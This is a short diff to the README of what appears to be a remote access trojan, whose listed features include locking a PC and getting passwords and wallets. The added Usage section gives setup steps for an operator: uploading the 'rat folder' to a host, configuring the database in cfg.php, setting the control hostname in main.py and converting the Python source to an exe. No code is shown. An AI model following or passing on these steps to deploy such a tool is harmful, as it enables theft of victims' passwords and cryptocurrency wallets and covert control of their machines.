@@ -11,6 +11,15 @@
 - Lock Pc
 - Get Passwords & Wallet
 
+## Usage
+
+  ### Step 1
+    - Upload rat folder to your host
+    - Configure the database settings (cfg.php)
+  ### Step 2  
+    - Change the hostname string in pythonsource (main.py - line 1)
+    - Convert to exe.
+
   
 ## API Usage
 
